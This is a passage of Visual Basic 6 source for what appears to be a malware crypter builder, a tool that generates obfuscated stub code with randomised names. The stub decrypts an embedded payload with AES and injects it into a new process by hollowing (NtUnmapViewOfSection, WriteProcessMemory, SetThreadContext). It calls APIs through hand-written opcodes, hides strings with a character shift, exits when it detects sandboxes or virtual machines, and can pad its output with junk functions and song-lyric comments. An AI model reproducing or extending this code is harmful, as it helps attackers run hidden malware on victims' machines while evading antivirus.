"  m_ri(m + 1) = (nb + j - c2) Mod nb: m_ri(m + 2) = (nb + j - c3) Mod nb" & vbNewLine & _
"  Next" & vbNewLine & _
"  N = m_Nb * (m_Nr + 1)" & vbNewLine & _
"  For i = 0 To m_Nk - 1" & vbNewLine & _
"  j = i * 4: CipherKey(i) = PackFrom(Key, j)" & vbNewLine & _
"  Next" & vbNewLine & _
"  For i = 0 To m_Nk - 1" & vbNewLine & _
"  m_fkey(i) = CipherKey(i)" & vbNewLine & _
"  Next" & vbNewLine & _
"  j = m_Nk: k = 0" & vbNewLine & _
"  Do While j < N" & vbNewLine
  
lAES = lAES & "  m_fkey(j) = m_fkey(j - m_Nk) Xor SubByte(RotateLeft(m_fkey(j - 1), 24)) Xor m_rco(k)" & vbNewLine & _
"  If m_Nk <= 6 Then" & vbNewLine & _
"  i = 1" & vbNewLine & _
"  Do While i < m_Nk And (i + j) < N" & vbNewLine & _
"  m_fkey(i + j) = m_fkey(i + j - m_Nk) Xor m_fkey(i + j - 1)" & vbNewLine & _
"  i = i + 1" & vbNewLine & _
"  Loop" & vbNewLine & _
"  Else" & vbNewLine & _
"  i = 1" & vbNewLine & _
"  Do While i < 4 And (i + j) < N" & vbNewLine & _
"  m_fkey(i + j) = m_fkey(i + j - m_Nk) Xor m_fkey(i + j - 1)" & vbNewLine & _
"  i = i + 1" & vbNewLine & _
"  Loop" & vbNewLine & _
"  If j + 4 < N Then m_fkey(j + 4) = m_fkey(j + 4 - m_Nk) Xor SubByte(m_fkey(j + 3))" & vbNewLine & _
"  i = 5" & vbNewLine & _
"  Do While i < m_Nk And (i + j) < N" & vbNewLine & _
"  m_fkey(i + j) = m_fkey(i + j - m_Nk) Xor m_fkey(i + j - 1)" & vbNewLine & _
"  i = i + 1" & vbNewLine & _
"  Loop" & vbNewLine & _
"  End If" & vbNewLine & _
"  j = j + m_Nk" & vbNewLine & _
"  k = k + 1" & vbNewLine & _
"  Loop" & vbNewLine & _
"  For j = 0 To m_Nb - 1" & vbNewLine & _
"  m_rkey(j + N - nb) = m_fkey(j)" & vbNewLine
  
lAES = lAES & "  Next" & vbNewLine & _
"  i = m_Nb" & vbNewLine & _
"  Do While i < N - m_Nb" & vbNewLine & _
"  k = N - m_Nb - i" & vbNewLine & _
"  For j = 0 To m_Nb - 1" & vbNewLine & _
"  m_rkey(k + j) = InvMixCol(m_fkey(i + j))" & vbNewLine & _
"  Next" & vbNewLine & _
"  i = i + m_Nb" & vbNewLine & _
"  Loop" & vbNewLine & _
"  j = N - m_Nb" & vbNewLine & _
"  Do While j < N" & vbNewLine & _
"  m_rkey(j - N + m_Nb) = m_fkey(j)" & vbNewLine & _
"  j = j + 1" & vbNewLine & _
"  Loop" & vbNewLine & _
"End Sub" & vbNewLine

lAES = lAES & "Private Sub Decrypt(buff() As Byte)" & vbNewLine & _
"  Dim i As Long, j As Long, k As Long, m As Long, a(7) As Long, b(7) As Long, x() As Long, y() As Long, t() As Long" & vbNewLine & _
"  For i = 0 To m_Nb - 1" & vbNewLine & _
"  j = i * 4: a(i) = PackFrom(buff, j): a(i) = a(i) Xor m_rkey(i)" & vbNewLine & _
"  Next" & vbNewLine & _
"  k = m_Nb: x = a: y = b" & vbNewLine & _
"  For i = 1 To m_Nr - 1" & vbNewLine & _
"  For j = 0 To m_Nb - 1" & vbNewLine & _
"  m = j * 3: y(j) = m_rkey(k) Xor m_rtable(x(j) And m_lOnBits(7)) Xor RotateLeft(m_rtable(Rshift(x(m_ri(m)), 8) And m_lOnBits(7)), 8) Xor RotateLeft(m_rtable(Rshift(x(m_ri(m + 1)), 16) And m_lOnBits(7)), 16) Xor RotateLeft(m_rtable(Rshift(x(m_ri(m + 2)), 24) And m_lOnBits(7)), 24): k = k + 1" & vbNewLine & _
"  Next" & vbNewLine & _
"  t = x: x = y: y = t" & vbNewLine & _
"  Next" & vbNewLine & _
"  For j = 0 To m_Nb - 1" & vbNewLine & _
"  m = j * 3: y(j) = m_rkey(k) Xor m_rbsub(x(j) And m_lOnBits(7)) Xor RotateLeft(m_rbsub(Rshift(x(m_ri(m)), 8) And m_lOnBits(7)), 8) Xor RotateLeft(m_rbsub(Rshift(x(m_ri(m + 1)), 16) And m_lOnBits(7)), 16) Xor RotateLeft(m_rbsub(Rshift(x(m_ri(m + 2)), 24) And m_lOnBits(7)), 24): k = k + 1" & vbNewLine & _
"  Next" & vbNewLine & _
"  For i = 0 To m_Nb - 1" & vbNewLine & _
"  j = i * 4: UnpackFrom y(i), buff, j: x(i) = 0: y(i) = 0" & vbNewLine & _
"  Next" & vbNewLine & _
"End Sub" & vbNewLine

lAES = lAES & "Private Function IsInitialized(ByRef vArray As Variant) As Boolean" & vbNewLine & _
"  On Error Resume Next" & vbNewLine & _
"  IsInitialized = IsNumeric(UBound(vArray))" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function DecryptData(bytIn() As Byte, bytPassword() As Byte) As Byte()" & vbNewLine & _
"  On Error Resume Next" & vbNewLine & _
"  Dim bytMessage() As Byte, bytKey(31) As Byte, bytOut() As Byte" & vbNewLine & _
"  Dim bytTemp(31) As Byte, lCount As Long, lLength As Long" & vbNewLine & _
"  Dim lEncodedLength As Long, bytLen(3) As Byte, lPosition As Long" & vbNewLine & _
"  If Not IsInitialized(bytIn) Then Exit Function" & vbNewLine & _
"  If Not IsInitialized(bytPassword) Then Exit Function" & vbNewLine & _
"  lEncodedLength = UBound(bytIn) + 1" & vbNewLine & _
"  If lEncodedLength Mod 32 <> 0 Then Exit Function" & vbNewLine & _
"  For lCount = 0 To UBound(bytPassword)" & vbNewLine & _
"  bytKey(lCount) = bytPassword(lCount)" & vbNewLine & _
"  If lCount = 31 Then Exit For" & vbNewLine & _
"  Next" & vbNewLine & _
"  gentables" & vbNewLine & _
"  gkey 8, 8, bytKey" & vbNewLine & _
"  ReDim bytOut(lEncodedLength - 1)" & vbNewLine & _
"  For lCount = 0 To lEncodedLength - 1 Step 32" & vbNewLine & _
"  " & f.aes.Text & " VarPtr(bytTemp(0)), VarPtr(bytIn(lCount)), 32" & vbNewLine & _
"  Decrypt bytTemp" & vbNewLine & _
"  " & f.aes.Text & " VarPtr(bytOut(lCount)), VarPtr(bytTemp(0)), 32" & vbNewLine & _
"  Next" & vbNewLine & _
"  " & f.aes.Text & " VarPtr(lLength), VarPtr(bytOut(0)), 4" & vbNewLine & _
"  If lLength > lEncodedLength - 4 Then Exit Function" & vbNewLine & _
"  ReDim bytMessage(lLength - 1)" & vbNewLine & _
"  " & f.aes.Text & " VarPtr(bytMessage(0)), VarPtr(bytOut(4)), lLength" & vbNewLine
  
lAES = lAES & "  DecryptData = bytMessage" & vbNewLine & _
"End Function" & vbNewLine

End Function
Private Function zuzu3()
a12.Text = xrn(a13.Text, "kernel32")
a15.Text = xrn(a14.Text, "kernel32")
a17.Text = xrn(a16.Text, "kernel32")
a19.Text = xrn(a18.Text, "ntdll")
a21.Text = xrn(a20.Text, "kernel32")
a23.Text = xrn(a22.Text, "kernel32")
a25.Text = xrn(a24.Text, "kernel32")

Sleep 1000

a27.Text = xrn(a26.Text, "kernel32")
f.a29.Text = xrn(f.a28.Text, "kernel32")
f.a31.Text = xrn(f.a30.Text, "kernel32")
f.a33.Text = xrn(f.a32.Text, "kernel32")
f.a37.Text = xrn(f.a36.Text, "kernel32")

Sleep 500

f.a39.Text = xrn(f.a38.Text, "GetModuleFileNameA")
f.a41.Text = xrn(f.a40.Text, "RtlMoveMemory")
f.a43.Text = xrn(f.a42.Text, "RtlMoveMemory")
f.a45.Text = xrn(f.a44.Text, "CreateProcessW")
f.a47.Text = xrn(f.a46.Text, "NtUnmapViewOfSection")

Sleep 500

If Check4.Value = 1 Then
zuzu3 = "  '" & lRan(20) & vbNewLine & "  '[Cheloo]" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'Mesajul e clar si nu se-ndreapta catre Marte," & vbNewLine & _
"  '" & lRan(5) & vbNewLine & _
"  'De dragu’ diversitatii," & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  '[Ombladon]" & vbNewLine & _
"  '" & lRan(8) & vbNewLine & _
"  'Citeste-o carte!" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  '[Cheloo]" & vbNewLine & _
"  '" & lRan(14) & vbNewLine & _
"  'Daca vrei sa faci lumina cand e pentru tine noapte," & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'Educa-te singur," & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  '[Ombladon]" & vbNewLine & _
"  '" & lRan(11) & vbNewLine & _
"  'Frate, citeste-o carte!" & vbNewLine & _
"  '" & lRan(10) & vbNewLine

End If

f.a49.Text = xrn(f.a48.Text, "VirtualAllocEx")
f.a51.Text = xrn(f.a50.Text, "WriteProcessMemory")
f.a53.Text = xrn(f.a52.Text, "WriteProcessMemory")
f.a55.Text = xrn(f.a54.Text, "GetThreadContext")
f.a57.Text = xrn(f.a56.Text, "WriteProcessMemory")
f.a59.Text = xrn(f.a58.Text, "SetThreadContext")
f.a61.Text = xrn(f.a60.Text, "ResumeThread")

If Check6.Value = 1 Then
zuzu3 = zuzu3 & "Private Function " & f.j2.Text & "()" & vbNewLine & _
"  On error goto " & f.j3.Text & vbNewLine & _
"  if " & f.j2.Text & " <> 0 then" & vbNewLine & _
"  " & f.j2.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.j3.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If

zuzu3 = zuzu3 & "Sub " & m43.Text & "(" & m53.Text & " As String, " & m54.Text & "() As Byte)" & vbNewLine & _
"  Dim " & m55.Text & "       As " & m10.Text & vbNewLine & _
"  Dim " & m56.Text & "         As " & m14.Text & vbNewLine & _
"  Dim " & m57.Text & "        As " & m15.Text & vbNewLine & _
"  Dim " & m58.Text & "        As " & m6.Text & vbNewLine & _
"  Dim " & m59.Text & "         As " & m7.Text & vbNewLine & _
"  Dim " & m60.Text & "        As " & m9.Text & vbNewLine & _
"  Dim " & m61.Text & "          As Long" & vbNewLine & _
"  Dim " & m63.Text & "       As Long" & vbNewLine & _
"  Dim " & m64.Text & "(255) As Byte" & vbNewLine & _
"  " & m58.Text & ".cb = Len(" & m58.Text & ")" & vbNewLine & _
"  " & m60.Text & ".ContextFlags = " & m1.Text & vbNewLine & _
"  If " & m53.Text & " = " & X & X & " Then" & vbNewLine & _
"  " & m63.Text & " = " & m42.Text & "(" & f.a34.Text & " (" & X & f.a36.Text & X & ", " & X & f.a37.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a38.Text & X & ", " & X & f.a39.Text & X & ") " & ", App.hInstance, VarPtr(" & m64.Text & "(0)), 256)" & vbNewLine & _
"  " & m53.Text & " = Left$(StrConv(" & m64.Text & ", vbUnicode), " & m63.Text & ")" & vbNewLine & _
"  End If" & vbNewLine & _
"  Call " & m42.Text & "(" & f.a34.Text & " (" & X & a13.Text & X & ", " & X & a12.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a40.Text & X & ", " & X & f.a41.Text & X & ") " & ", VarPtr(" & m55.Text & "), VarPtr(" & m54.Text & "(0)), Len(" & m55.Text & "))" & vbNewLine & _
"  Call " & m42.Text & "(" & f.a34.Text & " (" & X & a14.Text & X & ", " & X & a15.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a42.Text & X & ", " & X & f.a43.Text & X & ") " & ", VarPtr(" & m56.Text & "), VarPtr(" & m54.Text & "(" & m55.Text & ".e_lfanew)), Len(" & m56.Text & "))" & vbNewLine & _
"  Call " & m42.Text & "(" & f.a34.Text & " (" & X & a16.Text & X & ", " & X & a17.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a44.Text & X & ", " & X & f.a45.Text & X & ") " & ", 0, StrPtr(" & m53.Text & "), 0, 0, 0, " & m2.Text & ", 0, 0, VarPtr(" & m58.Text & "), VarPtr(" & m59.Text & "))" & vbNewLine & _
"  Call " & m42.Text & "(" & f.a34.Text & " (" & X & a18.Text & X & ", " & X & a19.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a46.Text & X & ", " & X & f.a47.Text & X & ") " & ", " & m59.Text & ".hProcess, " & m56.Text & ".OptionalHeader.ImageBase)" & vbNewLine & _
"  Call " & m42.Text & "(" & f.a34.Text & " (" & X & a20.Text & X & ", " & X & a21.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a48.Text & X & ", " & X & f.a49.Text & X & ") " & ", " & m59.Text & ".hProcess, " & m56.Text & ".OptionalHeader.ImageBase, " & m56.Text & ".OptionalHeader.SizeOfImage, " & m3.Text & " Or " & m4.Text & ", " & m5.Text & ")" & vbNewLine & _
"  Call " & m42.Text & "(" & f.a34.Text & " (" & X & a22.Text & X & ", " & X & a23.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a50.Text & X & ", " & X & f.a51.Text & X & ") " & ", " & m59.Text & ".hProcess, " & m56.Text & ".OptionalHeader.ImageBase, VarPtr(" & m54.Text & "(0)), " & m56.Text & ".OptionalHeader.SizeOfHeaders, 0)" & vbNewLine & _
"  For " & m61.Text & " = 0 To " & m56.Text & ".FileHeader.NumberOfSections - 1" & vbNewLine
  
zuzu3 = zuzu3 & "  " & t26.Text & " " & m57.Text & ", " & m54.Text & "(" & m55.Text & ".e_lfanew + Len(" & m56.Text & ") + Len(" & m57.Text & ") * " & m61.Text & "), Len(" & m57.Text & ")" & vbNewLine & _
"  Call " & m42.Text & "(" & f.a34.Text & " (" & X & a24.Text & X & ", " & X & a25.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a52.Text & X & ", " & X & f.a53.Text & X & ") " & ", " & m59.Text & ".hProcess, " & m56.Text & ".OptionalHeader.ImageBase + " & m57.Text & ".VirtualAddress, VarPtr(" & m54.Text & "(" & m57.Text & ".PointerToRawData)), " & m57.Text & ".SizeOfRawData, 0)" & vbNewLine & _
"  Next" & vbNewLine & _
"  Call " & m42.Text & "(" & f.a34.Text & " (" & X & a26.Text & X & ", " & X & a27.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a54.Text & X & ", " & X & f.a55.Text & X & ") " & ", " & m59.Text & ".hThread, VarPtr(" & m60.Text & "))" & vbNewLine & _
"  Call " & m42.Text & "(" & f.a34.Text & " (" & X & f.a28.Text & X & ", " & X & f.a29.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a56.Text & X & ", " & X & f.a57.Text & X & ") " & ", " & m59.Text & ".hProcess, " & m60.Text & ".Ebx + 8, VarPtr(" & m56.Text & ".OptionalHeader.ImageBase), 4, 0)" & vbNewLine

zuzu3 = zuzu3 & "  " & m60.Text & ".Eax = " & m56.Text & ".OptionalHeader.ImageBase + " & m56.Text & ".OptionalHeader.AddressOfEntryPoint" & vbNewLine & _
"  Call " & m42.Text & "(" & f.a34.Text & " (" & X & f.a30.Text & X & ", " & X & f.a31.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a58.Text & X & ", " & X & f.a59.Text & X & ") " & ", " & m59.Text & ".hThread, VarPtr(" & m60.Text & "))" & vbNewLine & _
"  Call " & m42.Text & "(" & f.a34.Text & " (" & X & f.a32.Text & X & ", " & X & f.a33.Text & X & ") " & ", " & f.a34.Text & " (" & X & f.a60.Text & X & ", " & X & f.a61.Text & X & ") " & ", " & m59.Text & ".hThread)" & vbNewLine & _
"End Sub" & vbNewLine

End Function
Private Function zuzu2()
If Check6.Value = 1 Then
zuzu2 = "Private Function " & f.j4.Text & "()" & vbNewLine & _
"  On error goto " & f.j5.Text & vbNewLine & _
"  if " & f.j4.Text & " <> 0 then" & vbNewLine & _
"  " & f.j4.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.j5.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If

zuzu2 = zuzu2 & "Public Function " & m42.Text & "(ByVal " & a2.Text & " As String, ByVal " & a3.Text & " As String, ParamArray " & a4.Text & "()) As Long" & vbNewLine & _
"  Dim " & a5.Text & " As Long" & vbNewLine & _
"  Dim " & a6.Text & "(&HEC00& - 1)  As Byte" & vbNewLine & _
"  Dim " & a7.Text & " As Long" & vbNewLine & _
"  Dim " & a8.Text & " As Long" & vbNewLine & _
"  Dim " & a9.Text & " As Long" & vbNewLine & _
"  Dim " & a10.Text & " As Long" & vbNewLine & _
"  On Error Resume Next" & vbNewLine & _
"  " & a8.Text & " = GetProcAddress(LoadLibraryA(" & a2.Text & "), " & a3.Text & ")" & vbNewLine & _
"  If " & a8.Text & " = 0 Then Exit Function" & vbNewLine & _
"  " & a5.Text & " = VarPtr(" & a6.Text & "(0))" & vbNewLine & _
"  " & a6.Text & "(0) = &H8B: " & a6.Text & "(1) = &H4C: " & a6.Text & "(2) = &H24" & vbNewLine & _
"  " & a6.Text & "(3) = &H8: " & a6.Text & "(4) = &H51:" & vbNewLine & _
"  " & a5.Text & " = " & a5.Text & " + 5" & vbNewLine & _
"  For " & a7.Text & " = UBound(" & a4.Text & ") To 0 Step -1" & vbNewLine & _
"  " & t26.Text & " ByVal " & a5.Text & ", &H68, &H1:              " & a5.Text & " = " & a5.Text & " + 1" & vbNewLine & _
"  " & t26.Text & " ByVal " & a5.Text & ", CLng(" & a4.Text & "(" & a7.Text & ")), &H4:   " & a5.Text & " = " & a5.Text & " + 4" & vbNewLine & _
"  Next" & vbNewLine & _
"  " & t26.Text & " ByVal " & a5.Text & ", &HE8, &H1:                  " & a5.Text & " = " & a5.Text & " + 1" & vbNewLine & _
"  " & t26.Text & " ByVal " & a5.Text & ", " & a8.Text & " - " & a5.Text & " - 4, &H4:       " & a5.Text & " = " & a5.Text & " + 4" & vbNewLine & _
"  " & t26.Text & " ByVal " & a5.Text & ", &H59, &H1:       " & a5.Text & " = " & a5.Text & " + 1" & vbNewLine & _
"  " & t26.Text & " ByVal " & a5.Text & ", &H89, &H1:       " & a5.Text & " = " & a5.Text & " + 1" & vbNewLine & _
"  " & t26.Text & " ByVal " & a5.Text & ", &H1, &H1:        " & a5.Text & " = " & a5.Text & " + 1" & vbNewLine

zuzu2 = zuzu2 & "  " & t26.Text & " ByVal " & a5.Text & ", &H66, &H1:       " & a5.Text & " = " & a5.Text & " + 1" & vbNewLine & _
"  " & t26.Text & " ByVal " & a5.Text & ", &H31, &H1:       " & a5.Text & " = " & a5.Text & " + 1" & vbNewLine & _
"  " & t26.Text & " ByVal " & a5.Text & ", &HC0, &H1:       " & a5.Text & " = " & a5.Text & " + 1" & vbNewLine & _
"  " & t26.Text & " ByVal " & a5.Text & ", &HC2, &H1:       " & a5.Text & " = " & a5.Text & " + 1" & vbNewLine & _
"  " & t26.Text & " ByVal " & a5.Text & ", &H10, &H1:       " & a5.Text & " = " & a5.Text & " + 1" & vbNewLine & _
"  " & t26.Text & " " & a9.Text & ", ByVal ObjPtr(Me), &H4" & vbNewLine & _
"  " & a9.Text & " = " & a9.Text & " + &H1C" & vbNewLine & _
"  " & t26.Text & " " & a10.Text & ", ByVal " & a9.Text & ", &H4" & vbNewLine & _
"  " & t26.Text & " ByVal " & a9.Text & ", VarPtr(" & a6.Text & "(0)), &H4" & vbNewLine & _
"  " & m42.Text & " = " & a1.Text & vbNewLine & _
"  " & t26.Text & " ByVal " & a9.Text & ", " & a10.Text & ", &H4" & vbNewLine & _
"End Function" & vbNewLine

If Check4.Value = 1 Then
Sleep 500
zuzu11 = zuzu11 & "  '" & lRan(RandomNumber) & vbNewLine & _
"  'Nici un soarece da biblioteca" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Nu poa ' sa ne-nteleaga" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Si prima vagaboanta" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Care l-a prins,il leaga..." & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Cand vorbesc serios,nimeni nu ma mai crede" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Si am doar false pareri da rau,sa vede..." & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine
End If
End Function
Private Function sase()
sase = sase & "Private Function " & m32.Text & "(" & m39.Text & ") As String" & vbNewLine & _
"  Dim " & m38.Text & " As Long" & vbNewLine & _
"  Dim " & m40.Text & " As Long" & vbNewLine & _
"  Dim " & m41.Text & " As String" & vbNewLine & _
"  For " & m38.Text & " = 1 To Len(" & m39.Text & ")" & vbNewLine & _
"  " & m40.Text & " = Asc(Mid(" & m39.Text & ", " & m38.Text & ", 1)) + 2" & vbNewLine & _
"  " & m41.Text & " = " & m41.Text & " & Chr(" & m40.Text & ")" & vbNewLine & _
"  Next " & m38.Text & vbNewLine & _
"  " & m32.Text & " = " & m41.Text & vbNewLine & _
"End Function" & vbNewLine

If Check6.Value = 1 Then
sase = sase & "Private Function " & f.junk17.Text & "()" & vbNewLine & _
"  On error goto " & f.junk18.Text & vbNewLine & _
"  if " & f.junk17.Text & " <> 0 then" & vbNewLine & _
"  " & f.junk17.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.junk18.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If

If Check4.Value = 1 Then
sase = sase & "  '" & lRan(30) & vbNewLine & _
"  'Imi plac berile," & vbNewLine & _
"  '" & lRan(22) & vbNewLine & _
"  'Nu verile," & vbNewLine & _
"  '" & lRan(26) & vbNewLine & _
"  'Nu strang averile," & vbNewLine & _
"  '" & lRan(23) & vbNewLine & _
"  'Pe noi nu ne conduc femeile," & vbNewLine & _
"  '" & lRan(30) & vbNewLine
End If
Sleep 500
End Function
Private Function sapte()
sapte = "Public Function " & f.r.Text & "(ByVal " & f.r2.Text & " As String) As String" & vbNewLine & _
"  Dim " & f.r1.Text & "       As Long" & vbNewLine & _
"  For " & f.r1.Text & " = 1 To Len(" & f.r2.Text & ")" & vbNewLine & _
"  " & f.r.Text & " = " & f.r.Text & " & Chr$(Asc(Mid$(" & f.r2.Text & ", " & f.r1.Text & ", 1)) + " & f.r3.Text & ")" & vbNewLine & _
"  Next " & f.r1.Text & vbNewLine & _
"End Function" & vbNewLine

End Function
Private Function cinci()
f.a85.Text = xrn(f.a84.Text, "kernel32")
f.a87.Text = xrn(f.a86.Text, "GetModuleHandleW")

f.a89.Text = xrn(f.a88.Text, "kernel32")
f.a91.Text = xrn(f.a90.Text, "GetModuleHandleW")

' c82.Text & "." & f.a34.Text & " (" & x & f.a86.Text & x & ", " & x & f.a87.Text & x & ") "
n.Text57.Text = RotxEncrypt(f.a84.Text)
n.Text58.Text = RotxEncrypt(f.a85.Text)
n.Text59.Text = RotxEncrypt(f.a86.Text)
n.Text60.Text = RotxEncrypt(f.a87.Text)
n.Text61.Text = RotxEncrypt("Q`gcBjj,bjj")
n.Text62.Text = RotxEncrypt("b`efcjn,bjj")
n.Text63.Text = RotxEncrypt("A8Z")
n.Text64.Text = RotxEncrypt("sqcpl_kc")
n.Text65.Text = RotxEncrypt("dgjc")
Sleep 500
n.Text66.Text = RotxEncrypt("q_knjc")
n.Text67.Text = RotxEncrypt("SQCPL?KC")
n.Text68.Text = RotxEncrypt("amknsrcpl_kc")
n.Text69.Text = RotxEncrypt("?SRM")
n.Text70.Text = RotxEncrypt("sqcpl_kc")
n.Text71.Text = RotxEncrypt("n_lb_")
n.Text72.Text = RotxEncrypt("sqcpl_kc")
n.Text73.Text = RotxEncrypt("lmprglem")
n.Text74.Text = RotxEncrypt("sqcpl_kc")
n.Text75.Text = RotxEncrypt("lmprgle.")
n.Text76.Text = RotxEncrypt("LMPRGLE.")
Sleep 500
n.Text77.Text = RotxEncrypt("sqcpl_kc")
n.Text78.Text = RotxEncrypt("LMPRGLEM")
n.Text79.Text = RotxEncrypt("VNQN1")
n.Text80.Text = RotxEncrypt("Hmc")
n.Text81.Text = RotxEncrypt("asppclrsqcp")
n.Text82.Text = RotxEncrypt("_lbw")
n.Text83.Text = RotxEncrypt("sqcpl_kc")

'  Dim TNow As Long
'  Dim TAfter As Long
'  TNow = API("kernel32", "GetTickCount")
'  API "kernel32", "Sleep", 500
'  TAfter = API("kernel32", "GetTickCount")
'  If TAfter - TNow < 500 Then End

'& f.r.Text & "("
cinci = cinci & "Private Function " & m31.Text & "()" & vbNewLine & _
"  If " & c82.Text & "." & m42.Text & "(" & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text57.Text & X & "), " & f.r.Text & "(" & X & n.Text58.Text & X & ")) " & ", " & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text59.Text & X & "), " & f.r.Text & "(" & X & n.Text60.Text & X & ")) " & ", StrPtr(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text61.Text & X & ")))) <> 0 Then End" & vbNewLine & _
"  If " & c82.Text & "." & m42.Text & "(" & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text57.Text & X & "), " & f.r.Text & "(" & X & n.Text58.Text & X & ")) " & ", " & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text59.Text & X & "), " & f.r.Text & "(" & X & n.Text60.Text & X & ")) " & ", StrPtr(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text62.Text & X & ")))) <> 0 Then End" & vbNewLine & _
"  If App.Path = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text63.Text & X & ")) Then" & vbNewLine & _
"  If Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text64.Text & X & "))) = " & m32.Text & "(" & X & "Qafkgbrg" & X & ") Then End" & vbNewLine & _
"  If App.EXEName = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text65.Text & X & ")) Then End" & vbNewLine & _
"  If App.EXEName = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text66.Text & X & ")) Then End" & vbNewLine & _
"  End If" & vbNewLine & _
"  If Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text67.Text & X & "))) = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text71.Text & X & ")) And Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text68.Text & X & "))) = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text69.Text & X & ")) Then End" & vbNewLine & _
"  If LCase(Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text70.Text & X & ")))) = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text81.Text & X & ")) Or LCase(Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text83.Text & X & ")))) = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text82.Text & X & ")) Then End" & vbNewLine & _
"  If Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text68.Text & X & "))) = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text79.Text & X & ")) And Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text77.Text & X & "))) = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text80.Text & X & ")) Then End" & vbNewLine & _
"  If Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text72.Text & X & "))) = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text73.Text & X & ")) Or Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text74.Text & X & "))) = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text75.Text & X & ")) Or Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text77.Text & X & "))) = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text78.Text & X & ")) Or Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text77.Text & X & "))) = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text76.Text & X & ")) Then End" & vbNewLine & _
"End Function" & vbNewLine

If Check6.Value = 1 Then
cinci = cinci & "Private Function " & f.junk15.Text & "()" & vbNewLine & _
"  On error goto " & f.junk16.Text & vbNewLine & _
"  if " & f.junk15.Text & " <> 0 then" & vbNewLine & _
"  " & f.junk15.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.junk16.Text & " : " & f.junk15.Text & " = 0" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If

End Function
Private Function patru()
patru = patru & "Private Function " & m33.Text & "(ByVal " & m44.Text & " As String, Optional ByVal " & m45.Text & " As String, Optional ByVal " & m46.Text & " As Long = -1) As String()" & vbNewLine & _
"  Dim " & m47.Text & "       As Long" & vbNewLine & _
"  Dim " & m48.Text & "        As Long" & vbNewLine & _
"  Dim " & m49.Text & "        As Long" & vbNewLine & _
"  Dim " & m50.Text & "        As Long" & vbNewLine & _
"  Dim " & m51.Text & "        As Long" & vbNewLine & _
"  Dim " & m52.Text & "()     As String" & vbNewLine & _
"  " & m49.Text & " = Len(" & m44.Text & ")" & vbNewLine & _
"  " & m50.Text & " = Len(" & m45.Text & ")" & vbNewLine & _
"  ReDim " & m52.Text & "(0)" & vbNewLine & _
"  " & m47.Text & " = 1" & vbNewLine & _
"  " & m48.Text & " = 1" & vbNewLine
patru = patru & "  Do" & vbNewLine & _
"  If " & m51.Text & " + 1 = " & m46.Text & " Then" & vbNewLine & _
"  " & m52.Text & "(" & m51.Text & ") = Mid$(" & m44.Text & ", " & m47.Text & ")" & vbNewLine & _
"  Exit Do" & vbNewLine & _
"  End If" & vbNewLine & _
"  " & m48.Text & " = InStr(" & m48.Text & ", " & m44.Text & ", " & m45.Text & ", vbBinaryCompare)" & vbNewLine & _
"  If " & m48.Text & " = 0 Then" & vbNewLine & _
"  If Not " & m47.Text & " = " & m49.Text & " Then" & vbNewLine & _
